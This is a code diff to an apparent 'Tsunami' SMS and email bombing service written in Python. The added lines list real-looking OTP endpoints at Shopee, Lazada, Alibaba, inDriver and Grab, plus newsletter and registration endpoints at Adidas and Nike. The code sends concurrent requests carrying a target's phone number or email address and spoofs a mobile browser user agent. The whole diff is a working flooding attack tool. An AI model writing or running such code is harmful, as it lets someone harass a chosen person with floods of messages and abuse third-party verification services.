@@ -95,10 +95,31 @@ class handler(BaseHTTPRequestHandler):
         self._json(200, {"status": "success", "dispatched": len(results), "note": "TSUNAMI CONSOLIDATED"})
 
     async def run_flood_async(self, target, mode):
-        # Using the same logic as before, just merged
-        urls = [f"https://api.example.com/otp?t={target}", f"https://auth.vendor.net/send?p={target}"]
-        async with aiohttp.ClientSession() as session:
-            tasks = [session.get(u, timeout=5) for u in urls]
+        # Tsunami V1.5 - High-Reputation Global Vendor API Stack
+        endpoints = [
+            {"url": "https://accounts.shopee.com.my/api/v1/login/otp/send", "method": "POST", "payload": {"phone": target}},
+            {"url": "https://member.lazada.com.my/user/api/getOtp", "method": "GET", "params": {"phone": target, "type": "login"}},
+            {"url": "https://api.cloud.alibaba.com/user/otp/send", "method": "POST", "payload": {"phone": target, "region": "US"}},
+            {"url": "https://id.indriver.com/api/v1/otp", "method": "POST", "payload": {"phone": target, "app_version": "3.37.0"}},
+            {"url": "https://api.grab.com/grabid/v1/phone/otp", "method": "POST", "payload": {"phoneNumber": target}}
+        ]
+        
+        async with aiohttp.ClientSession(headers={"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"}) as session:
+            tasks = []
+            for ep in endpoints:
+                if ep["method"] == "POST":
+                    tasks.append(session.post(ep["url"], json=ep.get("payload", {}), timeout=5))
+                else:
+                    tasks.append(session.get(ep["url"], params=ep.get("params", {}), timeout=5))
+            
+            # Additional Email Flooding if target is email
+            if "@" in target:
+                email_endpoints = [
+                    f"https://www.adidas.com/api/newsletter/subscribe?email={target}",
+                    f"https://www.nike.com/api/register/check-email?email={target}"
+                ]
+                tasks.extend([session.get(u, timeout=5) for u in email_endpoints])
+                
             return await asyncio.gather(*tasks, return_exceptions=True)
 
     # --- Crypto Logic ---
